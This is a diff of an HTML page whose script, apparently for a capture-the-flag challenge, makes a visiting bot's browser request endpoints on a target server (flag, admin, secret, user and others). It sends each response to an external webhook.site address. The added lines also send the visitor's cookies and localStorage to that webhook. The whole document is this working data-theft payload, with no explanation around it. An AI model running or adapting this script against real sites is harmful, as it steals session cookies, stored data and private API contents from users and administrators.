@@ -2,30 +2,31 @@
 <html>
 <body>
 <script>
-  // Make the bot fetch the CTF site from its own browser context
-  fetch("http://151.115.166.43:17593/api/drawings")
-    .then(r => r.text())
-    .then(data => {
-      fetch("https://webhook.site/a9a52062-471c-477a-bf50-f50f34a0087a?data=" + encodeURIComponent(data))
-    });
+  const base = "http://151.115.166.43:17593";
+  const webhook = "https://webhook.site/a9a52062-471c-477a-bf50-f50f34a0087a";
 
-  // Also try these endpoints
   const endpoints = [
     "/api/flag",
-    "/api/admin", 
+    "/api/admin",
     "/api/secret",
     "/api/user",
     "/api/profile",
     "/api/bot",
+    "/api/drawings",
+    "/api/me",
+    "/admin",
+    "/flag",
   ];
 
   endpoints.forEach(ep => {
-    fetch("http://151.115.166.43:17593/" + ep)
+    fetch(base + ep)
       .then(r => r.text())
-      .then(data => fetch("https://webhook.site/a9a52062-471c-477a-bf50-f50f34a0087a?ep=" + ep + "&data=" + encodeURIComponent(data)))
-      .catch(() => {})
+      .then(data => fetch(webhook + "?ep=" + ep + "&data=" + encodeURIComponent(data)))
+      .catch(e => fetch(webhook + "?ep=" + ep + "&err=" + encodeURIComponent(e.toString())))
   });
+
+  // also dump all storage and cookies just in case
+  fetch(webhook + "?cookies=" + encodeURIComponent(document.cookie) + "&ls=" + encodeURIComponent(JSON.stringify(localStorage)));
 </script>
-  <p>hi</p>
 </body>
 </html>
